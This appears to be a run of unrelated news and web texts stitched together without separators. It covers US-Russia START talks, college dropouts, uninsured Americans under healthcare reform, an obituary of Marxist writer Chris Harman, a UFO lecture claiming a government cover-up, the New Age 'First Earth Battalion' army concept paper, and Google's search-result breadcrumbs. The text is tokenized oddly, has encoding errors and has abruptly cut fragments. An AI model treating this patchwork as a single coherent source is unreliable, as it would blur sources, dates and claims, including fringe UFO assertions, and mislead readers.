Russia Foreign Minister Sergei Lavrov answers reporters questions at a news conference after his address to the U.N. Conference on Disarmament at the United Nations European headquarters in Geneva March 7 , 2009 .

The two largest nuclear powers have been trying to find a replacement for the 1991 Strategic Arms Reduction Treaty ( START I ) , which led to the biggest reduction in nuclear weapons in history , but have so far failed to reach a deal .
“ The treaty will stipulate a radical and unprecedented reduction in strategic offensive weapons , ” Lavrov was quoted as saying by the state - owned RIA news agency .
Cutting the vast arsenals of nuclear weapons built during the Cold War is the centerpiece of U.S. President Barack Obama ’s efforts to “ reset ” relations with Russia , which the United States is pressing to offer more help on Afghanistan and Iran .
Russia and the United States failed to agree on a successor to START I by December 5 , when the treaty was due to expire , and have extended it as they search for a new agreement .
Obama and Russian President Dmitry Medvedev failed to clinch a deal when they met on the sidelines of the U.N. climate conference in Copenhagen last week .
No reason was given , although they said they were close to an agreement .
Under a preliminary understanding agreed by the two presidents in July , the new treaty will reduce operationally deployed nuclear warheads to between at least 1,500 and 1,675 , a cut of about one - third from current levels .
Lavrov , whose ministry is leading talks along with the U.S. State Department , said negotiations in Geneva would resolve remaining issues after the Christmas and New Year holidays .
“ The delegations will resolve the remaining questions after the New Year break , ” Lavrov was quoted as saying by RIA during on a visit to the Uzbek capital , Tashkent .
TECHNICAL ISSUES
The talks in Geneva have been held in secret and both sides have agreed to a news blackout , although tension spilled into the open last week when Lavrov accused U.S. negotiators of dragging their feet .
This was denied by U.S. officials .
The negotiators have been discussing an array of technical arms control issues as they seek a deal which analysts say could pave the way for more ambitious talks aimed at cutting thousands of non-deployed nuclear warheads and shorter - range tactical nuclear warheads .
For a new START accord , Russia has called for cheaper verification procedures -- jargon for the inspections and data exchanges that ensure each side is implementing cuts .
Moscow has been concerned about a new generation of non-nuclear weapons with the destructive capability of some atomic weapons .
Lavrov said on Tuesday the two types of weapon would be formally linked in a new treaty .
“ The links between strategic offensive weapons with a nuclear and non-nuclear potential will be fixed in the new treaty , ” Lavrov said , according to Interfax .

The top reason the dropouts gave for leaving college was that it was just too hard to support themselves and go to school at the same time .
Balancing work and school was a bigger barrier than finding money for tuition , they said .
In fact , more than a third of the dropouts said that even if they got a grant that covered their books and tuition , it would be hard to go back to school , given their work and family commitments .
At a news conference Wednesday announcing the report , underwritten by the Bill and Melinda Gates Foundation , Frankie Barria , a 24 - year - old former student from New York City , described the stops and starts of his educational journey .
“ When I started college , I was living on my own at age 19 , ” Mr. Barria said .
“ My mom had left .
Usually the bird leaves the nest , but in my case , the nest left the bird . ”
Mr. Barria first enrolled at City College , but found it “ unbelievably hard ” to do well in school and maintain his job , so he left school .
Later , he completed a semester at Kingsborough Community College , but stopped when his job became too demanding .
Eventually , he enrolled at Medgar Evers College , but did not finish even one semester .
“ Having a roof over my head and food to eat was more important , ” he said .
Asked to rate 12 possible changes , the dropouts ’ most popular solutions were allowing part - time students to qualify for financial aid , offering more courses on weekends and evenings , cutting costs and providing child care .
The least popular were putting more classes online and making the college application process easier .
Hilary Pennington , a Gates Foundation education official , said two big factors associated with degree completion were going straight to college after high school and enrolling full time .
But , Ms. Pennington added , colleges need to be more accountable for making sure their students graduate .
“ If you try to leave a cellphone system , they almost wo n’t let you leave , and I just wonder if there ’s something we need to think about in higher education , ” she said .
“ We need a system where , if someone is struggling , if professors notice that somebody is missing a lot of classes , if someone does n’t early register , they immediately go to student - life services , and someone reaches out . ”

I donâ€™t wanna call this small experiment of information visualization neither information art .
Either way sounds too pretentious – as the visuals are not very sophisticated or elegant , and the way that the information is treated doesnâ€™t enable the extraction of advanced knowledge .
Although , it works very well as a ludic narrative .
I ultimately found it very joyful .
So sit back and enjoy .
It ’s fun to watch .

As the chief of military intelligence announced on Tuesday that Iran has acquired enough low - grade enriched uranium to make an atom bomb , IDF Southern Commander Major - General Yoav Gallant added to the pessimistic scenario , explaining the relative quiet in southern Israel is only temporary .
He admitted that it may be a matter of months , or years , but “ one sees the dark clouds coming out ” in a number of places .
Addressing a forum in Ben-Gurion University in the Negev , Gallant stated that this time period , the relative quiet , must be maximized to prepare for conflict or actual war .

Over 6,600 uninsured veterans will die by 2013 : estimate
If Democrats manage to pull off efforts to reform the US healthcare system and ensure coverage for millions who are currently without insurance , the new system — by design — will likely still leave tens of thousands to die without insurance before reforms kick in .
A Raw Story analysis , based on a recent Harvard Medical School study , estimates that 135,000 American citizens and over 6,600 US veterans will die due to a lack of health insurance before current proposed healthcare reform measures would take effect .

One hundred and thirty - five thousand US lives far exceeds the total number of Americans who died in the Korean War , the Vietnam War and the attacks of 9/11 combined .
The lives of over 6,600 US veterans is more — by over 1,300 — than the total number of US soldiers who have thus far died in both the Iraq and Afghanistan wars .
Dr. Steffie Woolhandler , a professor of medicine at Harvard University and co-author of the Harvard Medical School study , called Raw Story ’s estimates “ quite reasonable . ”
Even more shocking is that these are conservative estimates .
Health reform policy experts who spoke with Raw Story confirmed that the House and Senate bills would do virtually nothing for currently uninsured Americans until 2013 and 2014 , respectively .
Raw Story ’s calculations are based on the House health reform bill ’s projections .
The Senate bill , however , would add another year of lethal lag time , driving up the estimated death rate by tens of thousands more US citizens and veterans .
In part , the proposed Senate and House healthcare reform bills do n’t begin providing comprehensive coverage for several years because they are designed to meet President Obama ’s promised goal of creating a “ deficit - neutral ” healthcare package .
ADVERTISEMENT
Raw Story ’s analysis is based on a recent Harvard Medical School study published in the American Journal of Public Health and a subsequent report by a team of Harvard Medical School researchers who took part in the initial study .
The first study revealed that approximately 45,000 Americans die each year from lack of health insurance .
The second study , released on the eve of this past Veterans Day , estimated that more than 2,200 US veterans died in 2008 due to a lack of health insurance .
In an interview with Raw Story , Dr. David Himmelstein , associate professor of medicine at Harvard Medical School and co-author of the two studies , also pointed out a rarely discussed fact :
The proposed reforms in both the House and Senate bills , even in the long run , would still leave “ vast numbers ” of Americans uninsured and those who are partially insured with inadequate coverage .
ADVERTISEMENT
In the House bill , for instance , even after uninsured Americans would begin receiving health insurance , a projected 18 million would still not be covered ; roughly 23 million would remain uninsured in the Senate bill .
“ So basically they ’ve taken the bad approach and the slow approach both , ” said Himmelstein , a proponent of a national single - payer healthcare system .
“ And there ’s no particular reason other than political expediency why either of those things should exist . ”
ADVERTISEMENT
Veterans ’ advocate says analysis ‘ very disturbing ’
Paul Sullivan , executive director of Veterans for Common Sense , called Raw Story ’s analysis “ very disturbing ” and said the “ tragic ” numbers demand “ immediate action by the President of the United States . ”
“ Veterans for Common Sense is outraged that , in 2009 , veterans are dying because of a lack of healthcare , ” Sullivan said .
“ We believe healthcare is a human right . ”

He did , however , credit President Obama for taking steps to reverse what he described as former President Bush ’s “ deplorable ” legacy of neglecting veterans ’ health .
Sullivan also believes this is a national security issue and cited , for example , the correlation between the shortage of physicians in the military and the suicide epidemic .
Just last month , the Christian Science Monitor reported that the US Army is understaffed by as many as 800 mental health professionals and 300 substance abuse counselors .
On Monday , Time magazine reported that the Army has so far lost 147 soldiers this year to suicide , which is the highest number of suicides since the Army began keeping track of them in 1980 .
“ You ca n’t deploy someone to war two or three times and never give them a mental health exam , ” Sullivan said .

“ And when a veteran says he ’s having nightmares , he ca n’t sleep and has to see a doctor , ” he continued , “ but he has to wait several months before someone tells him he ’s not going to see a doctor at all and then goes and blows his brains out .
That ’s essentially what ’s happening right here .
And that ’s a legacy of President Bush ’s failure . ”
Woolhandler , who testified before Congress in 2007 about uninsured veterans , also sees these numbers , both for US veterans and everyday citizens as a national security issue .
“ Other developed countries have dealt with it that way , ” said Woolhandler , who supports a single - payer healthcare system .
“ They ’ve said as a matter of national policy , we need to make our people healthy and secure financial health with health insurance and have felt that was a national obligation .
I think that the other nations are correct in that regard . ”
Himmelstein said that the health of our citizens and veterans is not considered a national security issue “ because the powerful forces in our country do n’t care about the people who die . ”

“ The insurance companies and the corporate interests who largely fund our government do n’t actually care if 45,000 people or 2,200 veterans die , ” he said .
“ They do care to maintain the US control of , or at least contention for , oil - rich parts of the world and strategic assets and those sorts of things .
So I think it ’s a matter of what ’s in the interest of the corporations that by and large make policy in this country . ”
Why the wait until 2013 or 2014 ?
While a new health insurance system certainly can’t be implemented overnight , health and policy experts believe the delay in providing uninsured Americans with health insurance is chiefly due to political considerations .
Dr. Himmelstein asked , “ Why do we need to wait three or four years for a program to kick in ? ” and noted the speed with which Medicare went into effect .
President Lyndon Johnson signed Medicare into law on July 30 , 1965 and millions of seniors began receiving coverage within 11 months .

Himmelstein said the reason for the delay in either of the health reform bills is “ very simple ” and called it an “ accounting trick . ”
“ It ’s because it ’s so expensive that in order to get a ten - year budget estimate that ’s under the $ 900 billion figure , you have to delay it for three or four years , ” he explained .
“ It ’s really a budget estimate that ’s only six years worth of reform .
That ’s the only way they can keep the cost estimate down to something that ’s conceivable . ”
Agreeing with Himmelstein ’s assessment , Dr. Woolhandler said , “ Logistics are doable in a very short timeframe .
The politics are the difficult part . ”
She added , “ Ten years of taxes and six or seven years of benefits , so of course you can make something break even . ”

Steve Findlay , senior health policy analyst at Consumers Union , the independent non-profit publisher of Consumer Reports , thinks that ’s “ absolutely ” the case and described it as “ a tried and true ” method of funding big government programs .
“ Part of the drill here is to start collecting money and then the benefit does n’t actually kick in until later , ” Findlay said .
“ Once you begin to parse things out , you realize that one of your most substantial ways of saving money or of making the budget work is to , well , let ’s just put that off for a year . ”
Congressional Budget Office spokeswoman Melissa Merson declined to comment for this article .
Findlay , though , did point out that it ’s going to take time to set up the new marketplace .
ADVERTISEMENT
But he added , “ Could they do it faster than 2014 or 2013 ?
You know , you go to war sometimes in two weeks .
So I mean when you want to do things , you can do them .
But in this case , arguably it ’s not war .
We would love to see it implemented sooner . ”
Additionally , Findlay sees “ industry influence ” as a deciding factor in the lag time .
He explained that whenever large - scale changes and “ mega programs ” like this are launched they usually have an implementation process that takes two to three years .
“ But the reason for that , speaking very frankly , ” Findlay said , “ is industry influence on the process .
Industry will always be arguing in the hallways of Congress , ‘ If you ’re going to do it , you know , at least give us a few years . ’
And their argument is always the same really : ‘ It ’s going to cost us a lot of money to do this .
We have to change our systems .
We have to readjust our products and our services . ’
And blah , blah , blah . ”
ADVERTISEMENT
“ That ’s an argument that almost always prevails with respect to whether it ’s environmental regulations , welfare policy , you name it , ” he continued .
But Findlay noted the stimulus package , in which some of our largest financial institutions received a government bailout in a much shorter timeframe , was an exception .
Margaret F. Riley , a health law professor at the University of Virginia , thinks the budget is a “ huge ” reason for the delay .
Yet she also believes there are other reasonable political considerations at play , such as the desire to avoid negatively affecting the health insurance of Americans who are already receiving benefits in the process of rolling out a new system .
Still , she said , “ I ’m not a fan of the delay .
I think there are many reasons the delay runs risks . ”
Her primary concern is what might transpire in the interim .
“ In the political world , ” Riley noted , “ four years is an eternity and anything could happen to any bill passed . ”
The White House , Senate Leader Harry Reid ’s office , and House Leader Nancy Pelosi ’s office did not return Raw Story ’s calls for comment .

Tags : Chris Harman
This article , by Sandra Bloodworth , is republished from Australia ’s Socialist Alternative magazine .
Chris Harman , one of the greatest revolutionary Marxists of recent years , has died at the young age of 67 .
This is a tragic loss for the revolutionary left .
Harman was a revolutionary from his university days , and a leading member of the International Socialists ( which became the Socialist Workers Party ) in Britain by the age of 26 .
His writings will remain both an inspiration and source of important knowledge and arguments for anyone wanting to understand the genuine Marxist tradition .
The breadth of his research and writing was astonishing .
However , he was always focused on questions the revolutionary left needed to clarify , or debates into which he thought we should intervene .
So in 1984 , he wrote what was for many of us in the IS tradition , a seminal document on women ’s liberation .
It was a summary of conclusions drawn from several years of debate about women ’s oppression and the relationship between fighting for women ’s liberation and socialism .
In it he took up the question of whether women have always been oppressed .
Ever since he has followed debates in archaeology and anthropology .
In 1994 , in a special edition of the International Socialism Journal , he summarised Engels ’s arguments about the origins of humanity , the rise of classes , the state and women ’s oppression in light of the most recent knowledge and theories in these fields .
And only a few months ago he drew the attention of readers of the ISJ , which he edited , to new archaeological discussions about an early classless society .
In 1989 he intervened in the debates among Marxists on the transition from feudalism to capitalism , another topic which led to further research and intervention , with articles about the rise of the capitalist nation state , followed by the developments of that state and its relationship to capital .
He wrote widely about imperialism and produced a pivotal book on the creation of the East European Stalinist states after World War II .
His Fire Last
Time was likened at the time by one reviewer to Trotsky ’s History of the Russian Revolution in its grasp of the Marxist historical method .
It is a marvellous account of the radicalisation and struggles of the 1960s and 70s .
Only months before his untimely death , his latest analysis of the world economic system was published .
This was a re-statement of his original Explaining the Crisis which is one of the best explanations and defence of Marx ’s economic theory you will read .
Zombie Capitalism , the latest book , builds on that explanation and explains the new crisis the world system has entered .
His research and interventions are summarised in his A People ’s History of the World .
These works and more are some of the best sources for an understanding of the dreadful traditions of Stalinism ; they spell out succinctly and clearly the genuine Marxist analysis of twentieth century capitalism and into the twenty - first .
Harman never pursued ideas or historical knowledge simply for academic interest .
He was always intervening to win people to a Marxist world view .
I remember being in London when the Stalinist bloc was collapsing .
He was editor of the SWP ’s weekly paper , Socialist Worker , a demanding job , doing numerous talks at the Marxism conference , arguing with people from all corners of the world about what their organisations were doing .
At the same time he was madly learning Russian in the hope he could go to Russia and intervene in the ideological turmoil there , which he did .
The tragedy was the organisations of the IS tradition were too small to be a pole of attraction for the layer of intellectuals he and others debated .
The nightmare of Stalinism left a shadow which obscures the genuine Marxist revolutionary traditions , and it still hangs over the left world wide .
To step out from under that shadow , to understand the liberating force of Marxism , there is no better writer from the last 4 decades to study .
Chris Harman will be sorely missed by the revolutionary movement as we live through one of the terrible crises of capitalism he so clearly explained .
However , the work he has produced will stand us in good stead and remain as a lasting memorial to him as we face the task of building a revolutionary movement capable of ending the rule of capital once and for all – a project to which Harman gave every breath of energy he could muster for the whole of his adult life .
Healthcare reform : Strong opinions on all sides of the debate A healthcare bill drafted by the US Senate Finance Committee would expand insurance coverage but also cut the federal deficit , budget analysts say .
The nonpartisan Congressional Budget Office says the bill would cost $ 829bn ( £ 517bn ) over 10 years but also result in reducing the deficit by $ 81bn .
This analysis is in line with President Barack Obama 's own estimates .
His efforts to overhaul healthcare have been grinding through Congress amid arguments over costs and scope .
The finance committee will now vote on its bill next Tuesday , Senate leaders have announced .
The analysis by the Congressional Budget Office ( CBO ) was a key test , correspondents say , as drafting healthcare reform that does not add to the national debt has been a huge challenge .
If the CBO estimates had been much higher , it would have been a big blow to efforts by Mr Obama and the Democrats to have healthcare reform passed by the end of the year .
The real bill will be another 1,000 - page , trillion - dollar experiment
Mitch McConell
Senate Republican leader
Reform :
Who wants want Q&A : Healthcare reform The Congressional Budget Office ( CBO ) concluded that the legislation drafted by the influential finance panel would cost $ 829bn by 2019 but that spending cuts elsewhere and new revenue would actually result in lowering the federal deficit by $ 81bn over the 2010 - 2019 period .
The CBO also estimates that the number of people who do not have health insurance would be reduced by about 29 million , leaving about 25 million people uninsured .
About one - third of these would be illegal immigrants who are ineligible for insurance .
" Our balanced approach to health reform has paid off yet again , " said Sen Max Baucus , who chairs the Finance Committee .
Hurdles But Republicans say the final draft which will be voted on is likely to be very different and more expensive than this version .
" The real bill will be another 1,000 - page , trillion - dollar experiment , " Senate Republican leader Mitch McConnell said .
The finance committee 's bill must be combined with the Senate Health Committee 's bill , and go before the full Senate for a vote , where it is not guaranteed to pass , as it needs all the Democrats , two independents and one Republican to vote in favour .
If it passes the Senate , it will be combined with the House of Representatives ' version by a conference committee and go back before both houses for final approval .
All of the different versions of the bill are broadly similar in the scope of their reforms : toughen regulations on health insurers
mandate all Americans to get insurance
offer subsidies to the less well - off and set up health insurance exchanges for people without employer - sponsored coverage , to help them choose between different options .
Lawmakers are divided , however , over whether people with access to the exchanges should be allowed to choose a new state - run scheme - the so - called " public option " .

Stanton T. Friedman is a University of Chicago educated Physicist .
Evidence is overwhelming that intelligently controlled vehicles are visiting the Earth , which would lead to a cosmic Watergate if disclosed by the government , a nuclear physicist said Saturday in Murfreesboro .
Physicist Stanton T. Friedman said he has not seen an unidentified flying object but he has n’t seen Tokyo either , even though he knows the city exists .
His beliefs are based on years of study and interviews with citizens who sighted UFOs .
Friedman , known as the Flying Saucer Physicist , made his remarks before 80 people during the Tennessee Mutual Unidentified Flying Object Network meeting at the Baymont Suites on Armory Drive .
He is a former classmate of Carl Sagan .
During his lecture , Friedman outlined four conclusions : •
The evidence is overwhelming that Planet Earth is being visited by intelligently controlled extraterrestrial spacecraft .
In other words , some UFOs are alien spacecraft .
Most are not . •
The subject of flying saucers represents a kind of Cosmic Watergate , meaning that some few people in major governments have known since July , 1947 , when two crashed saucers and several alien bodies were recovered in New Mexico , that indeed some UFOs are ET .
As noted in 1950 , it ’s the most classified U.S. topic .
•
None of the arguments made against the first two conclusions by a small group of debunkers such as Carl Sagan , Friedman ’s University of Chicago classmate for three years , can stand up to careful scrutiny .
• The Flying Saucer story is the biggest story of the millennium : visits to Planet Earth by aliens and the U.S. government ’s cover -up of the best data ( the bodies and wreckage ) for over 50 years .
The federal government is not close to disclosure about UFOs because it would have serious implications to technology and the economy .
Church attendance would increase but the stock market would decrease .
Fundamentalist church groups would be upset because it would be a contradiction to their doctrine .
Also , governments fear young people will feel allegiance to the world , not their own countries .
Big powers would be afraid of loss of power .
UFOs are coming to Earth using energy the world does n’t know about now , he said .
Big oil companies might feel threatened if this technology were shared with mankind .
The more education a person has , the more likely they are to believe the Earth is being visited by UFOs , Friedman said .
Friedman first became interested in UFOs after reading a book in 1958 .
He worked for 14 years on the development of classified , advanced nuclear and space systems for GE , General Motors , Westinghouse , McDonnell Douglas and Aerojet General Nucleonics .
He gave his first lecture in 1967 and in the mid-1970s began the civilian investigation of the recovery of crashed flying saucers near Roswell , N.M. Friedman spoke to Jesse Marcell Sr. , who was the intelligence officer at a nearby air base .
Marcell went to the crash site with a rancher and viewed the debris field .
Jesse Marcell Jr. later wrote “ Roswell Legacy ” about his father ’s experiences and his recollection of his father bringing home part of the debris .
Friedman interviewed Barney and Betty Hill , who claimed they were abducted Sept. 19 , 1961 while driving in New Hampshire .
They went under hypnosis separately and told about their experiences .
He has published more than 90 UFO articles , co-authored “ Crash at Corona : The Definitive Study of the Roswell Incident ” and the new 2008 “ Flying Saucers and Science . ”
During the lecture , Friedman showed members a power point presentation about the Roswell investigation in 1947 .
The meeting was broadcast worldwide on short wave .
Max Mitchell of Kingsport , the state chief MUFON investigator , said there have been 96 reports in 2009 of UFOs investigated by MUFON as of November in Tennessee .
Participant Don Odom of Lewisburg , a retired Tennessee Wildlife Resources Officer , said his most memorable sighting while driving .
He stopped his truck and a 150 - foot long object floated by .
It was 300 to 500 feet away and had 22 porthole lights and strobe lights on the top and bottom .
It was red , white and blue .
He is now a MUFON field investigator .
Alyson Burgess , director of public relations for Tennessee MUFON headquartered in Memphis , said the mission statement of MUFON emphasizes the scientific study of UFOs for the benefit of humanity .
“ We here at Tennessee MUFON take the mission statement to heart by galvanizing our current membership and helping it to grow , ” Burgess said .
“ We may be part of a scientific finding that may benefit mankind . ”

Introduction
In 1979 , the Peoples Republic of China publicly reported that several thousand of its children aged 8 - 14 were capable of telepathy , clairvoyance , X - ray vision , or psychokinesis . [ EN1 ]
Having already heard about this program , the Central Intelligence Agency ( CIA ) , National Security Agency ( NSA ) , Defense Intelligence Agency ( DIA ) , Lawrence Livermore Laboratories , and the US Army were simultaneously pouring billions of dollars into their own similar research .
The Army program was headquartered at Fort Meade , Maryland , and was part of the Intelligence and Security Command ( INSCOM ) .
Leaders included Generals Edmund Thompson and Albert Stubblebine , and Colonel John Alexander . [ EN2 ]
Officers assigned to the US Army War College at Carlisle Barracks , Pennsylvania [ http://carlisle-www.army.mil/library/ris.htm] contributed research to the project , and " The First Earth Battalion " is essentially a textual copy of one group 's unclassified briefing slides .
Although decidedly New Age , the War College project was not entirely theoretical .
Colonel Alexander , for example , went on to become a leader in the Los Alamos National Lab 's non-lethal weapons program . [ EN3 ]
Likewise , during the early 1980s Special Forces hired Richard Strozzi Heckler and other outside contractors to provide two A - teams , a total of 25 men , with training in biofeedback , aikido , and " mind - body psychology . "
In the latter program , a typical training day included running , swimming , " industrial - strength " calisthenics , and 1 - 1/2 hours of aikido practice .
After six months , the soldiers were not aikido masters but they were quantifiably 75 % more physically fit than when they started . [ EN4 ]
During correspondence with the editor in January 2000 , author Channon had this to say :
The ideas circulated by this mythical force [ First Earth Battalion ] began with combat of the collective conscience the principal that if any contest is viewed by the television audience , it will be judged in the end on ethical superiority .
Thus cameras mounted on dune buggies .
The Army War College has the most exhaustive instructional materials on peacekeeping .
All these ideas were first represented by Earth Battalion thinkers and the manual you have .
And if nothing else , the following paper does suggest why drug testing became common for all ranks during the mid-1980s .

TASK FORCE DELTA -- CONCEPT PAPER
Problem statement .
Understanding that we must work through people , how can our Army establish and maintain control of changing , interdependent systems to maximize force readiness ?
Study thrusts .
Process of Influencing People .
The Process of Control .
The Dynamics of Change .
The Nature of Interdependence .
The Science of Systems .
The Dynamics of Force Readiness .
Concept Paper Title :
Concept : Task Force Delta 's effort needs the track of time .
Just as we maintain our perspective of the past and contact with the complexities of the present , our " First Earth Battalion " is the prime place to put thoughts of the future through a basic Army perspective .

[ PROJECT ] FOREWORD
The track of time comes hurtling up out of the past , from somewhere billions of years ago back in history .
It flicks by us as we stand here now in the present and then thrusts on for billions of years out ahead of us , out into the future , bound for some place called infinity .
Two things we know about time : its march is inexorable and it always gives rise to change .
Change , then , is like time , inexorable , inevitable and pervasive -- and so powerful and complex a thing that in just five billion years , change has produced , from inorganic matter and countless millions of experiments , complex living things such as social insects and mankind .
Any concept of change is a concept of time .
Thus any concept of change must involve past , present , and future .
Task Force Delta 's effort , as a concept of change , needs the track of time the lessons of history , the realities of the present , and the dreams and visions of the future .
Our " First Earth Battalion " is a place to dream .
A place to think the unthinkable .
It 's the prime place to put our thoughts of the future just as we must maintain our perspective of the past and contact with the complexities of the present .
It 's an " Earth " battalion because of what we know about a shrinking world , and about interdependencies among people , and nations , and natural resources interdependencies which everyday are becoming more evident to us all .
It 's a battalion because our study effort is directed to our Army , and the battalion is an entity which all of us soldiers from top to bottom , can comprehend .

[ AUTHOR'S ] FOREWORD
Making this planet whole requires the ethical use of force .
But even subcultures of force must evolve into a master culture .
The Army is no exception .
Soldiers can be the principal moral ethical basis on which things political can harmonize in the name of the Earth .

CIVILIZATION
Earthkind has grown from pack to village and then from village to tribe , then from tribe to territory and from territory to nation .
It is time to go from nation to planet .
The First Earth Battalion hereby declares its primary allegiance to the planet .
THE WARRIOR MONK
THE EARTH BATTALION IS AND IS BECOMING
The Earth Battalion is potential oriented , not mission oriented , so any definition of what it is or does tends to limit what it can become
At the moment it is a spirit among other things .
By 1990 it may be a pilot community of warrior - monks who completely recycle all resources , live amidst new nuclear reactors and waiting deployment to tension spots .
A think tank methodology for the U.S. Army -- a banner for the closet greathearts wherever they are -- a bonding agent for the idealist activists in the service and out -- a home for the ethical evolution of force -- an alternate form of service to the planet .
PIONEERS
The pioneering spirit is not dead in America !
Many of the Earth Battalion ideas are taken from the New Age .
This small sample of New Age groups shows there is plenty of gold left in the hills of the mind , body and spirit .
The rush is on !

Everyone in the First Earth is equally important in the eyes of the organization and will be provided for accordingly .
Status is achieved by the skill with which you do your chosen task .
It 's not important that you move up in the organization only that your skill level moves up .
Leaders will be those [ soldiers ] whose chosen skills are group interworking and spiritual development .
UNIFORMS WITHOUT UNIFORMITY
Always allowing for diversity we can share the ways that humans are all wonderfully unique .
The uniform must serve the soldier 's given task but must equally serve to share the most precious gift we each have to share our personality .
Common banners will serve to share the corporate Earth Battalion personality .
[ The picture shows a " Battalion Samurai Battle Mantle " ]
UNITY POWERED BY DIVERSITY
Synergy is possible when every soldier brings his or her individual best to the group task .
It is multiplied in strength again if that soldier truly loves the other members of the unit .
Then we shall have the maximum combat power available .
Things like Fuller 's tensegivity illustrate how the maximum in individual tension can be held delicately in check by group unity -- thereby generating the maximum potential energy .
The vector equilibrium , the visible structure , plus LOVE = the invisible bonding .
OMNI - DIRECTIONAL THOUGHT
The First Earth is not mission oriented it is potential oriented .
That means we shall continue to look everywhere to find non-destructive methods of control .
J.F.C. Fuller , the father of mechanized warfare , was an omni-directional thinker and a member of the world of the occult . [ EN5 ]
Be a guerrilla guru : [ explore ] the occult , the new age , the traditional , eastern philosophy , [ and ] space age technology .
SUPRA SEX
Jobs in the First Earth are based on capabilities .
Sex , age , color , or religious preferences are not considerations .
Culture has , however , programmed men and women so that they feel pressure to relate to each other sexually .
This sexual protocol can be overcome by a series of extended exercises requiring the absolute interdependence of all participants until a level is trust is developed that supercedes and rises above any kind of sexual relationship .
Fortunately love is still the by - product .
MISSIONS
The President just needs a wider range of options to respond to the 1980s .
Force as a concept has lost much of its legitimacy .
The time has come to take the lead in solving the problems of tomorrow .

REASONS TO BE
Soldiers are in the business of life and death .
As a leader during war , I must know that if my soldiers are to die that it's for the right reasons .
When at peace they deserve nothing less than a chance of personal evolution .
Soldiers can be a real part of the evolution of this Earth .
Anything less is just something less .
INTELLIGENT INITIATIVE
In the martial arts , one learns a number of possible countermoves against different types of possible enemies .
These practice battles are done over and over until they become instinct .
Likewise in the Earth Battalion all plausible engagements are war - gamed until each soldier has the routine cold .
In this way the battalion can operate in the absence of commands from its leaders , who may be out of touch , because of the new realities of modern warfare .
[ A chart compares " martial art stances " ( e.g. , prepare left , block left , en garde , prepare right ) to a flowchart reading : ]
If you are overrun -- move to the nearest road junction , take control of the buildings , wait for his towed artillery , destroy all you can till you have lost an offensive punch , then exfiltrate [ sneak out ] or surrender to save life .

Advance
Just like many systems when a nation or government becomes old , it is so full of its ideas [ that ] it has no room for new ones .
Well , there are New Age ideas with great power for the first body that decides to systematically use them .
THE EARTH BATTALION WILL HEAR THEM ALL .
[ The accompanying illustration shows a rucksack containing body vest music ( e.g. , a Walkman® ) , night vision foodstuffs , natural foods , dried munchie packs , divining tools ( divining rods had been used in Vietnam to find Viet Cong tunnels with at least as much success as CIA sonar systems ) , and ginseng regulators . ]
MARKING THE TRAIL
The American Indian revealed himself as an individual by his distinctive ornamentation .
His shield in some cases was more complete as a representation of his skills and predisposition than the modern soldier 's personnel file .
Earth Battalion soldiers will be encouraged to represent themselves well in their dress , and wear a twelve - pointed star with each axis clipped to reveal a dimension on a standard personality inventory test . [ EN7 ]
FIT TO FIGHT
Recently a world class health expert revealed his formula for being perfectly fit .
At the heart of good health , he chose a positive mental attitude .
Next in importance was aerobic exercise to get oxygen spread throughout the body .
Finally he broke down foods into the following priority :
Nuts / seeds / grains Vegetables ( raw ) Fruit
THE DELIVERY OF FIRES
Precision delivery [ of artillery fires ] is a function of clear and calm calculations .
The battalion Tactical Operations Center will employ every New Age centering tool to ensure our fire coordinators do their job of neutralization surgically .
[ Equipment shown for this New Age Tactical Operations Center included : ]
Samadi tank for command decisions .
[ Samadi tanks are isolation tanks said to provide " an ideal environment for relaxation and stress reduction , meditation , and the exploration of consciousness . "
Above the door is a sign reading : " Centering with mentations prior to entering . " ]
Neutralization oriented electronic map display .
[ This was similar to what was already becoming standard in naval Combat Information Centers . ]
Ergonomic settings [ as opposed to the traditional field table , tent or tracked vehicle , and plywood map board ] .
MAP DISPLAY
With the advent of electronic display many variations of maps are possible on the same surface .
Some ideas for the modern battlefield are :
Relief for direct - fire weapons .
Patterns to show gas or smoke coverage .
Building relief for MOUT ( military operations in urbanized terrain ) .
Strip maps for road movement .
[ On a First Earth Battalion map display : ]
Tank units look like tanks .
Larger units mean larger symbols .
If they [ tank units ] are moving , the road wheels *** pulse * **.
If you need their state of vulnerability press the top of the symbol .
( These two units are under the cover of smoke . )
If you need their projected power , press the front of the weapon ( the mobility and range of this weapons system ) .
If you need their potential [ power ] , press the back of the symbol ( unit strength , POL [ petroleum , oil , and lubricants ] , ammo , morale , etc. are presented in a series of scalar dimensions ) .
If you must have the Order of Battle [ 3rd Battalion , 37th Infantry ( Mechanized ) ] , then press the bottom of the symbol .
NEW AGE SYNTHESIS FOR A SAMURAI
Seek your own personal path to God
Actively improve your physical condition .
Master mental self control for combat .
Understand others .
Reinforce team interdependence .
Actively serve people and planet .
Indulge in happiness and humor .
TYPICAL BATTLE SCENARIO FIRST EARTH

For they would have to bloody the Earth Battalion people in their path before they could attack -- and the world would know .
SPIRITUAL TOOLS
The Universe yields wonderful energies for those who rise above physical mechanics .
The Earth Battalion will practice non-denominational techniques for spiritual bonding .
It is our right and they [ non- denominational meditation techniques ] shall make us stronger .
CONSCIENCE CORPS
When our Earth Battalion people become families and we hope they will , they will then leave the attack battalions and go to the nuclear release sites of each nation with a nuclear strike capability .
In this way they will be a clear and present reminder of what exists at the other end of a button .

EARTH PRAYER
Mother Earth my life support system as a soldier I must drink your blue water live inside your red clay and eat your green skin .
I pray my boots will always kiss your face and my footsteps match your heartbeat .
Carry my body through space and time you are my connection to the Universe and all that comes after .
I am yours and you are mine .
I salute you .
THE WARRIOR NET
A primary function of the First Earth is to communicate ideas .
Set up a network of information within your army and with friends in any army .
Soon continental coordination will emerge and then we will consider communications media other than the mail and telephone .
Let this battalion grow wherever there is interest .

The URL of this result is " www.productwiki.com/spidersapien, " which does n't provide much additional information about the site or this result .
Now take a look at the result with the new site hierarchy display :
The new text provides useful information about the page .
You can tell that the ProductWiki site has information about many different products , organized in different categories , and you can even tell that Spidersapien is a robot toy .
In addition , each phrase in the green line is actually a link .
For example , clicking on " Toys & Games " takes you to ProductWiki 's listing page for all toys , and clicking on " Robots " takes you to a list of their robot toys .
This way if you realize that you 're interested in a more general category than this specific product ( there are a lot of cool robot toys out there ) you can easily access information on broader topics .
The host and domain for the site ( in this case www.productwiki.com) will always be shown , so you always know what website you 're going to before you click .
There 's not always enough room to show the complete hierarchy , so sometimes we use ellipses to replace some of the intermediate levels , like in this result for [ how to make granola ] :
The information in these new hierarchies come from analyzing destination web pages .
For example , if you visit the ProductWiki Spidersapien page , you 'll see a series of similar links at the top , " Home > Toys & Games > Robots . "
